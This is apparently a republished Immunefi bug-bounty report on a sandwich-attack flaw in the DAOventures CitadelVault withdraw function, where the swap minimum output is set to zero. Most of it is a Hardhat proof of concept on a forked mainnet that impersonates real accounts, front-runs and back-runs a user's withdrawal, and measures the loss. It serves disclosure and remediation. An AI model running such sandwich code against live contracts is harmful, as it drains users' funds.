---
layout: forward
target: https://medium.com/@yeethsec/daoventures-sandwich-attack-vulnerability-b8f4402147e0
---


layout: post
title: DAOventures - Vault withdraws vulnerable to Sandwich Attacks
description: DAOventures Sandwich Attack
summary: Writeup on DAOventures Sandwich Attack
tags: solidity hacking
minute: 1


# Details
This is a report submitted through immunefi about a sandwich attack on DAOventures. The report has been paid out and closed.

# Description

## Target
https://etherscan.io/address/0x8fE826cC1225B03Aa06477Ad5AF745aEd5FE7066

## Smart Contract Bug Description
CitadelVault.sol line 338: `_amounts = router.swapExactTokensForTokens(_amountIn, 0, _path, address(this), block.timestamp);` Amount out is set to 0 which leaves withdrawing vulnerable to sandwich attacks with flashbots.

## Proof of concept/Steps to Reproduce
```
const { expect } = require("chai");
const { network, ethers, waffle } = require("hardhat");

describe("CitadelVault", function () {
  this.timeout(0);

  it("Shouldn't be sandwichable", async function () {
    weth_whale_address = "0xE78388b4CE79068e89Bf8aA7f218eF6b9AB0e9d0";
    sushi_address = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F";
    dai_address = "0x6b175474e89094c44da98b954eedeac495271d0f";
    weth_address = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";

    withdrawer_address = "0x1c7679cf155d6df0523743bc4f26f4a08b6a7daf";
    vault_address = "0x8fE826cC1225B03Aa06477Ad5AF745aEd5FE7066";

    // Impersonate withdrawer
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [withdrawer_address],
    });
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [weth_whale_address],
    });
    const attacker = await ethers.getSigner(weth_whale_address);
    const signer = await ethers.getSigner(withdrawer_address);

    const CitadelVault = await ethers.getContractAt("CitadelVault", vault_address);
    const DAI = await ethers.getContractAt("IERC20", dai_address);
    const WETH = await ethers.getContractAt("IERC20", weth_address);
    const SUSHI = await ethers.getContractAt("IUniswapV2Router02", sushi_address);

    // Normal withdraw
    console.log("Normal withdraw");
    console.log((await DAI.balanceOf(signer.getAddress())).toString());

    await CitadelVault.connect(signer).withdraw("8492500000000000000", "2");

    const normal_withdraw_amount = await DAI.balanceOf(signer.getAddress());
    console.log((await DAI.balanceOf(signer.getAddress())).toString());

    // Reset network
    await network.provider.request({
      method: "hardhat_reset",
      params: [
        {
          forking: {
            jsonRpcUrl: "https://eth-mainnet.alchemyapi.io/v2/DywMbqEbxubKh3WjZQlDUG3MpGVpmCaM",
            blockNumber: 13017013,
          },
        },
      ],
    });
    
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [withdrawer_address],
    });
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [weth_whale_address],
    });

    // Sandwiched withdraw
    console.log("\nSandwiched withdraw");
    console.log((await DAI.balanceOf(signer.getAddress())).toString());

    // Front run sandwich swap
    trade_path = [WETH.address, DAI.address];
    inverse_trade_path = [DAI.address, WETH.address];
    const amount = await WETH.balanceOf(attacker.address);
    
    await WETH.connect(attacker).approve(SUSHI.address, amount);

    await SUSHI.connect(attacker).swapExactTokensForTokens(
      amount,
      0,
      trade_path,
      attacker.address,
      Date.now() + 500*60*10
    );

    const dai_balance = await DAI.balanceOf(attacker.address);
    
    await CitadelVault.connect(signer).withdraw("8492500000000000000", "2");
    
    // Back run sandwich swap
    await DAI.connect(attacker).approve(SUSHI.address, dai_balance);

    await SUSHI.connect(attacker).swapExactTokensForTokens(
      dai_balance,
      0,
      inverse_trade_path,
      attacker.address,
      Date.now() + 500*60*10
    );

    const sandwich_attacked_amount = await DAI.balanceOf(signer.getAddress());
    console.log((await DAI.balanceOf(signer.getAddress())).toString());

    console.log("Incurred loss: $" + ethers.utils.formatEther(normal_withdraw_amount.sub(sandwich_attacked_amount)));
    expect(sandwich_attacked_amount < normal_withdraw_amount);
  });
});
```

## Impact
Users can lose up to the entire value of their shares when withdrawing.

## Risk Breakdown
Difficulty to Exploit: `Easy`  
CVSS2 Score: `Critical`  

## Recommendation
Allow the users to supply Amount Out or utilize an oracle and calculate a slippage amount within standards

## References
https://cmichel.io/de-fi-sandwich-attacks/
